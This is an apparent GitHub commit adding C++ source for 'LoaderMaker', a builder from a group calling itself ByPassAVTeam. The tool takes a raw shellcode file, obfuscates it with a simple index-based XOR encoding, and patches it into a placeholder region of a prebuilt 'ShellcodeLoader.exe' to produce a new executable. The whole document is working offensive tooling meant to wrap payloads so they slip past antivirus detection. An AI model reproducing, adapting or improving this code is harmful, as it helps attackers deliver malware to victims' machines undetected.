5b713beb1b6548ee62a566971f136a506e4cb750
ByPassAVTeam <107661904+ByPassAVTeam@users.noreply.github.com>
2022-06-22 08:55:50 +0800

    Add files via upload

---
+++ src/LoaderMaker/main.cpp
@@ -0,0 +1,61 @@
+#include "main.h"
+
+
+int main(int argc, char* argv[], char* envp[])
+{
+	printf(" .--. .-.         .-.  .-.                 .-.      .-.                   .-.           \r\n");
+	printf(": .--': :         : :  : :                 : :      : :                   : :           \r\n");
+	printf("`. `. : `-.  .--. : :  : :   .--.  .--.  .-' : .--. : :    .--.  .--.   .-' : .--. .--. \r\n");
+	printf(" _`, :: .. :' '_.': :_ : :_ '  ..'' .; :' .; :' '_.': :__ ' .; :' .; ; ' .; :' '_.': ..'\r\n");
+	printf("`.__.':_;:_;`.__.'`.__;`.__;`.__.'`.__.'`.__.'`.__.':___.'`.__.'`.__,_;`.__.'`.__.':_;  \r\n");
+	printf("                                                                                        \r\n");
+	if (argc == 3)
+	{
+		FILEINFO shellinfo = Openfile(argv[1]);
+		for (int i = 0; i < shellinfo.size; i++)
+		{
+			shellinfo.ptrbuffer[i] = (shellinfo.ptrbuffer[i] ^ i )+ 1;
+		}
+
+        char loadername[] = "ShellcodeLoader.exe";
+        FILEINFO loaderinfo = Openfile(loadername);
+		int cnt = 0,offset = 0,num = 0;
+		while (TRUE)
+		{
+			if (loaderinfo.ptrbuffer[cnt] == 0x41)
+			{
+				offset = cnt;
+				while (loaderinfo.ptrbuffer[cnt] == 0x41)
+				{
+					cnt++;
+					num++;
+					if (num > 0x50)
+					{
+						break;
+					}
+				}
+			}
+			if (num > 0x50)
+			{
+				break;
+			}
+			cnt++;
+			num = 0,offset = 0;
+			//scan shellcode buffer
+		}
+		Mymemcpy(&(loaderinfo.ptrbuffer[offset]), &(shellinfo.size),sizeof(DWORD));
+
+		Mymemcpy(&(loaderinfo.ptrbuffer[offset + sizeof(DWORD)]), shellinfo.ptrbuffer, shellinfo.size);
+		Write2file(loaderinfo.ptrbuffer, loaderinfo.size,argv[2]);
+		printf("\r\n[+] output file------->%s\r\n",argv[2]);
+	}
+	else
+	{
+		printf("[*]usage:\r\n");
+		printf("[*]LoaderMaker.exe <shellcode.c>  <outfile.exe> \r\n");
+		printf("[*]example:\r\n");
+		printf("[*]LoaderMaker.exe shellcode.bin loader.exe\r\n");
+	}
+	//getchar();
+	return 0;
+}
---
+++ src/LoaderMaker/main.h
@@ -0,0 +1,124 @@
+#pragma once
+#include<windows.h>
+#include<stdio.h>
+#define DATA_SIZE 27136
+
+
+typedef struct
+{
+	DWORD size;
+	PBYTE ptrbuffer;
+}FILEINFO;
+FILEINFO Openfile(char* ptrFile)
+{
+	DWORD dwReadTotal = 0;
+	DWORD dwReaded = 0;
+	FILEINFO fileinfo = { 0 };
+	HANDLE hFile = NULL;
+	hFile = CreateFileA(ptrFile,
+		FILE_SHARE_READ,
+		0,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL);
+
+	if (hFile == INVALID_HANDLE_VALUE)
+		goto END;
+
+	fileinfo.size = GetFileSize(hFile, NULL);
+	if (fileinfo.size == 0)
+		goto END;
+
+	fileinfo.ptrbuffer = (byte*)HeapAlloc(GetProcessHeap(), 0, fileinfo.size);
+	if (fileinfo.ptrbuffer == 0)
+		goto END;
+	SecureZeroMemory(fileinfo.ptrbuffer, fileinfo.size);
+
+	while (dwReadTotal < fileinfo.size
+		&& ReadFile(hFile, fileinfo.ptrbuffer + dwReadTotal, fileinfo.size - dwReadTotal, &dwReaded, NULL))
+	{
+		dwReadTotal += dwReaded;
+	}
+END:
+	if (hFile != INVALID_HANDLE_VALUE)
+	{
+		CloseHandle(hFile);
+	}
+	return fileinfo;
+};
+void* __cdecl Mymemcpy(void* dest,
+	const void* src,
+	size_t 	count
+)
+{
+	char* char_dest = (char*)dest;
+	char* char_src = (char*)src;
+
+	if ((char_dest <= char_src) || (char_dest >= (char_src + count)))
+	{
+		/*  non-overlapping buffers */
+		while (count > 0)
+		{
+			*char_dest = *char_src;
+			char_dest++;
+			char_src++;
+			count--;
+		}
+	}
+	else
+	{
+		/* overlaping buffers */
+		char_dest = (char*)dest + count - 1;
+		char_src = (char*)src + count - 1;
+
+		while (count > 0)
+		{
+			*char_dest = *char_src;
+			char_dest--;
+			char_src--;
+			count--;
+		}
+	}
+
+	return dest;
+}
+BOOL Write2file(PBYTE file, DWORD contentLen, PCHAR path)//写入文件，测试通过
+{
+
+	HANDLE pFile;
+	PBYTE tmpBuf = nullptr;
+	DWORD dwBytesWrite, dwBytesToWrite;
+
+	pFile = CreateFileA(path, GENERIC_WRITE,
+		0,
+		NULL,
+		CREATE_ALWAYS,        //总是创建文件
+		FILE_ATTRIBUTE_NORMAL,
+		NULL);
+
+	if (pFile == INVALID_HANDLE_VALUE)
+	{
+		CloseHandle(pFile);
+		HeapFree(GetProcessHeap(), 0, file);
+		return FALSE;
+	}
+
+	dwBytesToWrite = contentLen;
+	dwBytesWrite = 0;
+
+	tmpBuf = file;
+
+	do {                                       //循环写文件，确保完整的文件被写入  
+
+		WriteFile(pFile, tmpBuf, dwBytesToWrite, &dwBytesWrite, NULL);
+
+		dwBytesToWrite -= dwBytesWrite;
+		tmpBuf += dwBytesWrite;
+
+	} while (dwBytesToWrite > 0);
+
+	CloseHandle(pFile);
+	HeapFree(GetProcessHeap(), 0, file);
+	return TRUE;
+}
